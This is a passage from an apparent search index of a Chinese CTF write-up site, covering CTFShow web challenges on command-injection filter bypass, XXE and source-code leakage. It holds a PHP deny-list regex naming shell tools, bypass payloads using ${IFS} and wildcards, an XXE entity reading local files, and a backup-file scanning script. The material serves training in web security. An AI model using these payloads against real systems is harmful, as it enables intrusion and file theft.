<p>\u6216\u8005\uff1a<code>?c=ca\\t${IFS}fla?.php</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-54","title":"Web 54","text":"PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\", $c)) {\n        system($c);\n    }\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre> <p>\u5b98\u65b9\uff1a<code>/bin/?at${IFS}f???????</code></p> <p>\u5148\u76f4\u63a5<code>?c=ls</code>\uff0c\u5f97\u5230<code>flag.php index.php</code></p> <p>\u89e3\u6cd5\u4e00\uff1a</p> <p>\u4f7f\u7528\u4f7f\u7528mv\u547d\u4ee4\u628aflag\u6587\u4ef6\u91cd\u547d\u540d\uff0c\u518d\u4f7f\u7528uniq\u67e5\u770ba.txt\uff08\u5982\u679c\u7b2c\u4e8c\u6b65\u770b\u4e0d\u5230\uff0c\u8bf7\u53f3\u952e\u67e5\u770b\u6587\u4ef6\u6e90\u4ee3\u7801\uff09</p> <p>\u7b2c\u4e00\u6b65\uff1a<code>?c=mv${IFS}fla?.php${IFS}a.txt</code> \u7b2c\u4e8c\u6b65\uff1a<code>c=uniq${IFS}a.txt</code> \uff0c\u5176\u5b9e\u76f4\u63a5\u8bbf\u95eea.txt\u4e5f\u884c</p> <p>\u8fd9\u513f\u6709\u4e24\u4e2a\u65b0\u4e1c\u897f\uff0c\u7b2c\u4e00\u4e2a\u662f<code>mv</code>\u547d\u4ee4\uff0c\u7b2c\u4e8c\u4e2a\u662f<code>uniq</code>\u3002</p> <p>\u89e3\u6cd5\u4e8c\uff1a<code>?c=grep${IFS}%27fla%27${IFS}f???????%0a</code></p> <p>\u83dc\u9e1f\u6559\u7a0b\u7684grep\uff1aLinux grep \u547d\u4ee4</p>"},{"location":"WEB/CTFShow/CTFShow-Sql%E6%B3%A8%E5%85%A5/","title":"CTFshow Sql\u6ce8\u5165","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb171 - Web253</p>"},{"location":"WEB/CTFShow/CTFShow-XXE/","title":"CTFshow XXE","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb373 - Web378</p> <p>\u5173\u4e8eXXE\uff1a\u4e00\u7bc7\u6587\u7ae0\u5e26\u4f60\u6df1\u5165\u7406\u89e3\u6f0f\u6d1e\u4e4b XXE \u6f0f\u6d1e</p>"},{"location":"WEB/CTFShow/CTFShow-XXE/#web-373","title":"Web 373","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif (isset($xmlfile)) {\n    $dom = new DOMDocument();\n    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n    $creds = simplexml_import_dom($dom);\n    $ctfshow = $creds-&gt;ctfshow;\n    echo $ctfshow;\n}\nhighlight_file(__FILE__);\n?&gt;\n</code></pre> <p>\u8be5\u6bb5PHP\u4ee3\u7801\u5177\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ol> <li> <p>\u7981\u7528PHP\u9519\u8bef\u62a5\u544a\uff08\u7b2c1\u884c\uff09:</p> <ul> <li>\u901a\u8fc7\u8c03\u7528<code>error_reporting(0)</code>\u51fd\u6570\uff0c\u8bbe\u7f6e\u5168\u5c40\u9519\u8bef\u62a5\u544a\u7ea7\u522b\u4e3a0\uff0c\u5373\u5173\u95ed\u6240\u6709PHP\u9519\u8bef\u3001\u8b66\u544a\u548c\u901a\u77e5\u7684\u663e\u793a\u3002\u8fd9\u6837\u505a\u53ef\u80fd\u51fa\u4e8e\u5b89\u5168\u8003\u8651\u6216\u907f\u514d\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u5411\u7528\u6237\u66b4\u9732\u4e0d\u5fc5\u8981\u7684\u5185\u90e8\u4fe1\u606f\u3002</li> </ul> </li> <li> <p>\u542f\u7528libxml\u5b9e\u4f53\u52a0\u8f7d\uff08\u7b2c2\u884c\uff09:</p> <ul> <li>\u8c03\u7528<code>libxml_disable_entity_loader(false)</code>\u51fd\u6570\u4ee5\u91cd\u65b0\u542f\u7528libxml\u5e93\u4e2d\u7684\u5916\u90e8\u5b9e\u4f53\u52a0\u8f7d\u529f\u80fd\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6b64\u529f\u80fd\u88ab\u7981\u7528\u4ee5\u9632\u6b62\u6f5c\u5728\u7684XML\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb\u3002\u5728\u6b64\u573a\u666f\u4e2d\uff0c\u7531\u4e8e\u9700\u8981\u5904\u7406\u5305\u542bDTD\uff08\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff09\u7684XML\u8f93\u5165\uff0c\u56e0\u6b64\u9009\u62e9\u542f\u7528\u5b9e\u4f53\u52a0\u8f7d\u3002</li> </ul> </li> <li> <p>\u4ece\u8f93\u5165\u6d41\u4e2d\u83b7\u53d6XML\u6570\u636e\uff08\u7b2c3\u884c\uff09:</p> <ul> <li>\u4f7f\u7528<code>file_get_contents('php://input')</code>\u4ecePHP\u7684\u8f93\u5165\u6d41\uff08<code>php://input</code>\uff09\u4e2d\u8bfb\u53d6\u539f\u59cbPOST\u6570\u636e\u3002\u8fd9\u8868\u660e\u9884\u671f\u63a5\u6536\u7684\u662f\u975e\u8868\u5355\u7f16\u7801\u7684\u6570\u636e\uff0c\u5982XML\u5185\u5bb9\uff0c\u4e14\u4f20\u9012\u65b9\u5f0f\u53ef\u80fd\u662fPOST\u6216\u5176\u4ed6\u652f\u6301\u539f\u59cb\u6570\u636e\u4f20\u8f93\u7684\u65b9\u6cd5\u3002</li> </ul> </li> <li> <p>\u68c0\u67e5\u5e76\u89e3\u6790XML\u6570\u636e\uff08\u7b2c4-6\u884c\uff09:</p> <ul> <li> <p>\u9996\u5148\uff0c\u4f7f\u7528<code>isset()</code>\u51fd\u6570\u68c0\u67e5\u662f\u5426\u5b58\u5728\u63a5\u6536\u5230\u7684XML\u6570\u636e\u3002</p> <ul> <li> <p>\u82e5\u5b58\u5728\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684DOMDocument\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528\u5176<code>loadXML()</code>\u65b9\u6cd5\u6765\u89e3\u6790XML\u5b57\u7b26\u4e32\u3002\u4f20\u5165\u4e24\u4e2a\u53c2\u6570\uff1a</p> </li> <li> <p><code>$xmlfile</code>\uff1a\u5f85\u89e3\u6790\u7684XML\u5b57\u7b26\u4e32\u3002</p> </li> <li> <p><code>LIBXML_NOENT | LIBXML_DTDLOAD</code></p> <p>\u8fd9\u4e24\u4e2a\u5e38\u91cf\u4f5c\u4e3a\u6807\u5fd7\u4f4d\uff0c\u5206\u522b\u8868\u793a\uff1a</p> <ul> <li><code>LIBXML_NOENT</code>: \u5728\u89e3\u6790\u65f6\u66ff\u6362\u5b9e\u4f53\u5f15\u7528\u3002</li> <li><code>LIBXML_DTDLOAD</code>: \u52a0\u8f7d\u5916\u90e8DTD\uff08\u5982\u679c\u6709\uff09\uff0c\u4ee5\u4fbf\u6b63\u786e\u89e3\u6790XML\u7ed3\u6784\u548c\u9a8c\u8bc1\u6570\u636e\u3002</li> </ul> </li> </ul> </li> <li> <p>\u7136\u540e\uff0c\u4f7f\u7528<code>simplexml_import_dom()</code>\u51fd\u6570\u5c06\u5df2\u89e3\u6790\u7684<code>DOMDocument</code>\u5bf9\u8c61\u8f6c\u6362\u4e3a\u66f4\u6613\u4e8e\u64cd\u4f5c\u7684<code>SimpleXMLElement</code>\u5bf9\u8c61\u3002</p> </li> <li> <p>\u6700\u540e\uff0c\u901a\u8fc7<code>$creds-&gt;ctfshow</code>\u8bbf\u95ee\u5e76\u5b58\u50a8<code>ctfshow</code>\u8282\u70b9\u7684\u503c\u3002</p> </li> </ul> </li> <li> <p>\u8f93\u51fa<code>ctfshow</code>\u8282\u70b9\u7684\u503c\uff08\u7b2c7\u884c\uff09:</p> <ul> <li>\u4f7f\u7528<code>echo</code>\u8bed\u53e5\u5c06\u4e4b\u524d\u83b7\u53d6\u5230\u7684<code>$ctfshow</code>\u53d8\u91cf\uff08\u5373<code>ctfshow</code>\u8282\u70b9\u7684\u503c\uff09\u53d1\u9001\u81f3\u6d4f\u89c8\u5668\uff0c\u4f9b\u5ba2\u6237\u7aef\u67e5\u770b\u6216\u8fdb\u4e00\u6b65\u5904\u7406\u3002</li> </ul> </li> <li> <p>\u9ad8\u4eae\u663e\u793a\u5f53\u524dPHP\u6e90\u4ee3\u7801\uff08\u7b2c8\u884c\uff09:</p> <ul> <li><code>highlight_file(__FILE__)</code>\u51fd\u6570\u8c03\u7528\u4f1a\u8f93\u51fa\u5f53\u524d\u6267\u884c\u811a\u672c\uff08\u7531<code>__FILE__</code>\u9b54\u672f\u5e38\u91cf\u6807\u8bc6\uff09\u7684\u6e90\u4ee3\u7801\uff0c\u5e76\u5e94\u7528\u8bed\u6cd5\u9ad8\u4eae\u3002\u8fd9\u79cd\u505a\u6cd5\u901a\u5e38\u7528\u4e8e\u5f00\u53d1\u73af\u5883\uff0c\u4fbf\u4e8e\u5f00\u53d1\u8005\u76f4\u89c2\u67e5\u770b\u548c\u7406\u89e3\u4ee3\u7801\u7ed3\u6784\u3002\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u51fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u4e0d\u5efa\u8bae\u542f\u7528\u6b64\u529f\u80fd\u3002</li> </ul> </li> </ol> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u8fd9\u6bb5PHP\u4ee3\u7801\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a5\u6536\u5e76\u89e3\u6790\u542b\u6709DTD\u7684XML\u8f93\u5165\uff0c\u63d0\u53d6\u5176\u4e2d<code>ctfshow</code>\u8282\u70b9\u7684\u503c\uff0c\u5e76\u5c06\u8be5\u503c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002\u540c\u65f6\uff0c\u5728\u5f00\u53d1\u9636\u6bb5\uff0c\u5b83\u8fd8\u5c55\u793a\u4e86\u5f53\u524d\u811a\u672c\u7684\u6e90\u4ee3\u7801\u4ee5\u8f85\u52a9\u8c03\u8bd5\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-XXE/#payloadfileflag","title":"payload\uff1a\u76f4\u63a5file:///flag","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE XXE [\n&lt;!ENTITY cmd SYSTEM \"file:///flag\"&gt;\n]&gt;\n&lt;mumuzi&gt;\n    &lt;ctfshow&gt;&amp;cmd;&lt;/ctfshow&gt;\n&lt;/mumuzi&gt;\n</code></pre> <ol> <li> <p>XML\u58f0\u660e\uff1a</p> <ul> <li><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</code> \u8fd9\u662fXML\u6587\u6863\u7684\u8d77\u59cb\u58f0\u660e\uff0c\u6307\u5b9a\u4e86\u4f7f\u7528\u7684XML\u7248\u672c\u4e3a1.0\u4ee5\u53ca\u5b57\u7b26\u7f16\u7801\u65b9\u5f0f\u4e3aUTF-8\u3002</li> </ul> </li> <li> <p>DOCTYPE\u58f0\u660e\u4e0e\u5185\u90e8\u5b50\u96c6\uff1a</p> <ul> <li> <p><code>&lt;!DOCTYPE XXE [ ... ]&gt;</code></p> <p>\u8fd9\u662f\u4e00\u4e2aDOCTYPE\u58f0\u660e\uff0c\u7528\u4e8e\u6307\u5b9a\u6587\u6863\u9075\u5faa\u7684DTD\uff08Document Type Definition\uff0c\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff09\u3002\u8fd9\u91cc\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a<code>XXE</code>\u7684\u81ea\u5b9a\u4e49DOCTYPE\u3002</p> <ul> <li>\u5728\u65b9\u62ec\u53f7<code>[ ... ]</code>\u5185\u5b9a\u4e49\u4e86\u5185\u90e8\u5b50\u96c6\uff0c\u5305\u542b\u4e86\u9488\u5bf9\u5f53\u524dDOCTYPE\u7684\u5b9e\u4f53\u3001\u5c5e\u6027\u7b49\u5b9a\u4e49\u3002</li> </ul> </li> </ul> </li> <li> <p>\u5b9e\u4f53\u5b9a\u4e49\uff1a</p> <ul> <li> <p><code>&lt;!ENTITY cmd SYSTEM \"file:///flag\"&gt;</code></p> <p>\u5728\u5185\u90e8\u5b50\u96c6\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a<code>cmd</code>\u7684\u5b9e\u4f53\u3002\u8fd9\u4e2a\u5b9e\u4f53\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\uff1a</p> <ul> <li><code>SYSTEM \"file:///flag\"</code>\uff1a\u6307\u5b9a\u5b9e\u4f53\u503c\u5e94\u4ece\u6307\u5b9a\u7684URI\uff08\u7edf\u4e00\u8d44\u6e90\u6807\u8bc6\u7b26\uff09\u83b7\u53d6\u3002\u8fd9\u91cc\u7684URI\u6307\u5411\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u8def\u5f84<code>/flag</code>\uff0c\u4f7f\u7528\u7684\u662f<code>file://</code>\u534f\u8bae\u3002</li> </ul> </li> </ul> </li> <li> <p>XML\u5143\u7d20\uff1a</p> <ul> <li><code>&lt;mumuzi&gt;</code> \u548c <code>&lt;/mumuzi&gt;</code> \u5b9a\u4e49\u4e86\u4e00\u4e2a\u6839\u5143\u7d20\uff0c\u540d\u4e3a<code>mumuzi</code>\u3002</li> <li><code>&lt;ctfshow&gt;</code> \u548c <code>&lt;/ctfshow&gt;</code> \u4f5c\u4e3a<code>mumuzi</code>\u7684\u5b50\u5143\u7d20\uff0c\u5176\u5185\u5bb9\u4e3a<code>&amp;cmd;</code>\u3002</li> </ul> </li> </ol>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"CTFshow \u4fe1\u606f\u6cc4\u9732","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb1 - Web20</p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-2","title":"web 2 \u6e90\u7801","text":"<p>URL\u524d\u52a0\u5165<code>view-source:</code>    \u67e5\u770b\u6e90\u4ee3\u7801\u3002</p> <p>\u6216\u8005\u76f4\u63a5<code>ctrl+u</code></p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-5-phps","title":"web 5 .phps","text":"<p>.phps\u5bfc\u81f4\u6e90\u7801\u6cc4\u9732  phps\u6587\u4ef6\u5c31\u662fphp\u7684\u6e90\u4ee3\u7801\u6587\u4ef6\uff0c\u901a\u5e38\u7528\u4e8e\u63d0\u4f9b\u7ed9\u7528\u6237\uff08\u8bbf\u95ee\u8005\uff09\u76f4\u63a5\u901a\u8fc7Web\u6d4f\u89c8\u5668\u67e5\u770bphp\u4ee3\u7801\u7684\u5185\u5bb9\u3002  \u56e0\u4e3a\u7528\u6237\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7Web\u6d4f\u89c8\u5668\u201c\u770b\u5230\u201dphp\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u9700\u8981\u7528phps\u6587\u4ef6\u4ee3\u66ff\u3002  \u5e76\u4e0d\u662f\u6240\u6709\u7684php\u6587\u4ef6\u90fd\u5b58\u5728.phps\u540e\u7f00\uff0c\u4e0d\u662f\u9ed8\u8ba4\u5e26\u6709\uff0c\u53ea\u4f1a\u5728\u7279\u6b8a\u60c5\u51b5\u4e0b\u5b58\u5728\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-6","title":"Web 6 \u6e90\u7801\u6cc4\u9732","text":"<p>\u5e38\u89c1\u7684\u7f51\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u540e\u7f00</p> <ul> <li>tar</li> <li>tar.gz</li> <li>zip</li> <li>rar</li> <li>bak</li> </ul> <p>\u5e38\u89c1\u7684\u7f51\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u540d - web - website - backup - back - www - wwwroot - temp</p> <p>\u811a\u672c\uff1a</p> Python<pre><code>import requests\n\nurl1 = 'url'\n\n# url\u4e3a\u88ab\u626b\u63cf\u5730\u5740\n\nlist1 = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']\n\nlist2 = ['tar', 'tar.gz', 'zip', 'rar']\n\nfor i in list1:\n\n    for j in list2:\n\n        back = str(i) + '.' + str(j)\n\n        url = str(url1) + '/' + back\n\n        print(back + '    ', end='')\n\n        print(requests.get(url).status_code)\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-9-vim","title":"web 9 vim\u7f13\u5b58","text":"<p>\u5728\u4f7f\u7528vim\u65f6\u4f1a\u521b\u5efa\u4e34\u65f6\u7f13\u5b58\u6587\u4ef6\uff0c\u5173\u95edvim\u65f6\u7f13\u5b58\u6587\u4ef6\u5219\u4f1a\u88ab\u5220\u9664\uff0c\u5f53vim\u5f02\u5e38\u9000\u51fa\u540e\uff0c\u56e0\u4e3a\u672a\u5904\u7406\u7f13\u5b58\u6587\u4ef6\uff0c\u5bfc\u81f4\u53ef\u4ee5\u901a\u8fc7\u7f13\u5b58\u6587\u4ef6\u6062\u590d\u539f\u59cb\u6587\u4ef6\u5185\u5bb9\u3002</p> <p>\u4ee5 index.php \u4e3a\u4f8b\uff1a\u7b2c\u4e00\u6b21\u4ea7\u751f\u7684\u4ea4\u6362\u6587\u4ef6\u540d\u4e3a .index.php.swp\u3002</p> <p>\u518d\u6b21\u610f\u5916\u9000\u51fa\u540e\uff0c\u5c06\u4f1a\u4ea7\u751f\u540d\u4e3a .index.php.swo \u7684\u4ea4\u6362\u6587\u4ef6\u3002</p> <p>\u7b2c\u4e09\u6b21\u4ea7\u751f\u7684\u4ea4\u6362\u6587\u4ef6\u5219\u4e3a .index.php.swn\u3002</p> <p>\u6ce8\u610f\uff1a\u6700\u524d\u9762\u6709\u4e00\u4e2a\u70b9\uff0c\u4e5f\u5c31\u662f\u8bf4\u5e94\u8be5\u662f<code>http://xxxxx.com/.index.php.swp</code>\u800c\u4e0d\u662f<code>http://xxxxx.com/index.php.swp</code></p> <p>\uff08\u4f46\u662f\u8fd9\u4e2a\u9898\u6ca1\u6709\u70b9\u5440\uff09</p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-11","title":"\uff1fweb 11","text":"<p>\u67e5\u8be2\u57df\u540d\u89e3\u6790\u5730\u5740\uff0c\u57fa\u672c\u683c\u5f0f\uff1a<code>nslookup host [server]</code></p> <p>\u67e5\u8be2\u57df\u540d\u7684\u6307\u5b9a\u89e3\u6790\u7c7b\u578b\u7684\u89e3\u6790\u8bb0\u5f55 \u57fa\u672c\u683c\u5f0f\uff1a<code>nslookup -type=type host [server]</code></p> <p>\u67e5\u8be2\u5168\u90e8 \u57fa\u672c\u683c\u5f0f\uff1a<code>nslookup -query=any host [server]</code></p> <p>\u7f16\u8f91<code>nslookup -query=any flag.ctfshow.com</code></p> <p>C:\\Users\\16032&gt;nslookup -query=any flag.ctfshow.com \u670d\u52a1\u5668:  public-dns-a.baidu.com Address:  180.76.76.76</p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#nslookup","title":"nslookup","text":"<p>nslookup \u4e3b\u8981\u7528\u6765\u8bca\u65ad\u57df\u540d\u7cfb\u7edf (DNS) \u57fa\u7840\u7ed3\u6784\u7684\u4fe1\u606f\u3002\u67e5\u8be2DNS\u7684\u8bb0\u5f55\uff0c\u67e5\u8be2\u57df\u540d\u89e3\u6790\u662f\u5426\u6b63\u5e38\uff0c\u5728\u7f51\u7edc\u6545\u969c\u65f6\u7528\u6765\u8bca\u65ad\u7f51\u7edc\u95ee\u9898\u3002</p> <ol> <li>\u67e5\u8be2\u57df\u540d\u89e3\u6790\u5730\u5740</li> </ol> <p><code>nslookup sohu.com</code> \u91c7\u7528\u9ed8\u8ba4\u7684DNS\u670d\u52a1\u5668\u67e5\u8be2</p> <p><code>nslookup sohu.com 114.114.114.114</code> \u91c7\u7528\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\u67e5\u8be2</p> <p>\u6ce8\uff1a</p> <ol> <li> <p>\u6bcf\u4e2aDNS\u670d\u52a1\u5668\u67e5\u8be2\u5230\u7684IP\u53ef\u80fd\u4e0d\u76f8\u540c</p> </li> <li> <p>\u53ef\u80fd\u67e5\u8be2\u51fa\u6765\u7684\u8bb0\u5f55\u4f1a\u51fa\u73b0\u591a\u4e2a</p> </li> <li> <p>\u5bf9\u4e8e\u88ab\u6c61\u67d3\u7684\u57df\u540d\uff0c\u67e5\u8be2\u7684\u7ed3\u679c\u662f\u4e0d\u51c6\u786e\u7684</p> </li> </ol> <ol> <li>\u67e5\u8be2\u57df\u540d\u7684\u6307\u5b9a\u89e3\u6790\u7c7b\u578b\u7684\u89e3\u6790\u8bb0\u5f55</li> </ol> <p>\u683c\u5f0f\uff1a<code>nslookup -type=type domain [dns-server]</code></p> <ol> <li>\u67e5\u8be2\u5168\u90e8</li> </ol> <p><code>nslookup -query=any qq.com</code></p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-11-2-cdn","title":"Web 11-2 CDN\u7ed5\u8fc7","text":"<p>\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0cbilibili\u4e0a\u7684\u89c6\u9891\u4e2d\u7684Web 11\u548c\u7f51\u7ad9\u4e0a\u7684\u4e0d\u4e00\u6837\uff0c\u89c6\u9891\u4e0a\u7684\u662f\u8981\u627e\u5230\u7f51\u7ad9\u771f\u5b9e\u7684ip\u5730\u5740\uff0c\u4f46\u662f\u901a\u8fc7ping\u7f51\u7ad9\u4ee5\u53ca\u7528\u5404\u7c7b\u5de5\u5177\u7f51\u7ad9\u90fd\u6ca1\u6709\u67e5\u5230\uff0c\u6700\u540e\u5c06\u7f51\u5740\u52a0\u4e0a\u201cwww\u201d\u7136\u540e\u7528\u52a0\u4e863w\u7684\u8fdb\u884cping\uff0c\u6210\u529f\u8fd4\u56de\u4e86\u771f\u5b9e\u7684ip\u5730\u5740\u3002</p> <p>\u8fd9\u4e2a\u5c31\u662f\u8bf4\u660e\uff0c\u539f\u7f51\u7ad9\u662f\u67093W\u7684\u7f51\u7ad9\uff0c\u7136\u540e\u4e00\u4e9bcdn\u4f1a\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u4ece\u539f\u7f51\u7ad9\u6293\u53d6\u4e00\u4e0b\u9759\u6001\u7684\u6570\u636e\uff0c\u7136\u540e\u5f53\u6211\u4eec\u8bbf\u95ee\u65f6\u8bbf\u95ee\u7684\u5c31\u662f\u8fd9\u4e9bcdn\u52a0\u901f\u670d\u52a1\u5668\u7684ip</p> <p>\u53c2\u8003\u6587\u7ae0\uff1a\u5e72\u8d27-6\u79cdCDN\u7ed5\u8fc7\u6280\u672f</p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-16-php","title":"web 16 PHP\u63a2\u9488","text":"<p>PHP\u63a2\u9488\u5b9e\u9645\u4e0a\u662f\u4e00\u79cdWeb\u811a\u672c\u7a0b\u5e8f\uff0c\u4e3b\u8981\u662f\u7528\u6765\u63a2\u6d4b\u865a\u62df\u7a7a\u95f4\u3001\u670d\u52a1\u5668\u7684\u8fd0\u884c\u72b6\u51b5\uff0c\u800c\u672c\u8d28\u4e0a\u662f\u901a\u8fc7PHP\u8bed\u8a00\u5b9e\u73b0\u63a2\u6d4bPHP\u670d\u52a1\u5668\u654f\u611f\u4fe1\u606f\u7684\u811a\u672c\u6587\u4ef6\uff0c\u901a\u5e38\u7528\u4e8e\u63a2\u6d4b\u7f51\u7ad9\u76ee\u5f55\u3001\u670d\u52a1\u5668\u64cd\u4f5c\u7cfb\u7edf\u3001PHP\u7248\u672c\u3001\u6570\u636e\u5e93\u7248\u672c\u3001CPU\u3001\u5185\u5b58\u3001\u7ec4\u4ef6\u652f\u6301\u7b49\uff0c\u57fa\u672c\u80fd\u591f\u5f88\u5168\u9762\u7684\u4e86\u89e3\u670d\u52a1\u5668\u7684\u5404\u9879\u4fe1\u606f\u3002</p> <p>\u5e38\u89c1\u7684PHP\u63a2\u9488\u6709\uff1a</p> <ul> <li>\u96c5\u9ed1php\u63a2\u9488\uff1a\u4e00\u822c\u7528\u4e8elinux\u7cfb\u7edf\uff0c\u76ee\u524d\u4e0d\u652f\u6301PHP7\u4ee5\u4e0a\u7248\u672c\u3002</li> <li>X\u63a2\u9488\uff1a\uff08\u53c8\u540d\u5218\u6d77\u63a2\u9488\uff09\u662f\u4e00\u6b3e\u7531 INN STUDIO \u539f\u521b\u4e3b\u5bfc\u5f00\u53d1\u7684\u5f00\u6e90 PHP \u63a2\u9488\uff0c\u652f\u6301PHP5.3+\u4ee5\u4e0a\u3002</li> <li>UPUPW php\u63a2\u9488\uff1a\u5b89\u5168\u6027\u8f83\u9ad8\uff0c\u53ef\u4ee5\u9632\u63a2\u9488\u6cc4\u9732\uff0c\u4e00\u822c\u7528\u4e8ewindow\u7cfb\u7edf\u3002</li> </ul> <p>\u63a2\u9488\u7684\u6587\u4ef6\u5e38\u89c1\u547d\u540d\u4e3a<code>tz.php</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u5fa1\u5251\u626b\u63cf</p> <p>\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6253\u5f00<code>phpinfo</code></p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#web-20-mdb","title":"web 20  mdb\u6587\u4ef6\u6cc4\u9732","text":"<p>mdb\u6587\u4ef6\u662f\u65e9\u671fasp+access\u6784\u67b6\u7684\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u6587\u4ef6\u6cc4\u9732\u76f8\u5f53\u4e8e\u6570\u636e\u5e93\u88ab\u8131\u88e4\u4e86\u3002</p> <p>dirsearch\u9012\u5f52\u626b\u63cf</p> <p>\u53ef\u80fd\u662f /db/db.mdb </p>"},{"location":"WEB/CTFShow/CTFShow-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#other-ds_store","title":"other .DS_Store","text":"<p>.DS_Store \u662f Mac OS \u4fdd\u5b58\u6587\u4ef6\u5939\u7684\u81ea\u5b9a\u4e49\u5c5e\u6027\u7684\u9690\u85cf\u6587\u4ef6\u3002\u5982\u6587\u4ef6\u7684\u56fe\u6807\u4f4d\u7f6e\u6216\u80cc\u666f\u8272\uff0c\u76f8\u5f53\u4e8eWindows\u7684desktop.ini\u3002 \u5176\u5220\u9664\u4ee5\u540e\u7684\u526f\u4f5c\u7528\u5c31\u662f\u8fd9\u4e9b\u4fe1\u606f\u7684\u5931\u53bb\u3002\u901a\u8fc7.DS_Store\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u76ee\u5f55\u91cc\u9762\u6240\u6709\u6587\u4ef6\u7684\u6e05\u5355\u3002   </p> <p>\u548c\u522b\u4eba\u4ea4\u6362\u6587\u4ef6\uff08\u6216\u4f60\u505a\u7684\u7f51\u9875\u9700\u8981\u4e0a\u4f20\u7684\u65f6\u5019\uff09\u5e94\u8be5\u628a .DS_Store \u6587\u4ef6\u5220\u9664\u6bd4\u8f83\u59a5\u5f53\uff0c\u56e0\u4e3a\u91cc\u9762\u5305\u542b\u4e86\u4e00\u4e9b\u4f60\u4e0d\u4e00\u5b9a\u5e0c\u671b\u522b\u4eba\u770b\u89c1\u7684\u4fe1\u606f\u3002\u5c24\u5176\u662f\u7f51\u7ad9\uff0c\u901a\u8fc7 .DS_Store \u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u76ee\u5f55\u91cc\u9762\u6240\u6709\u6587\u4ef6\u7684\u6e05\u5355\uff0c\u5f88\u591a\u65f6\u5019\u8fd9\u662f\u4e00\u4e2a\u4e0d\u5e0c\u671b\u51fa\u73b0\u7684\u95ee\u9898\u3002</p> <p>DS_Store\u6587\u4ef6\u6cc4\u6f0f .DS_Store\u662fMac\u4e0bFinder\u7528\u6765\u4fdd\u5b58\u5982\u4f55\u5c55\u793a \u6587\u4ef6/\u6587\u4ef6\u5939 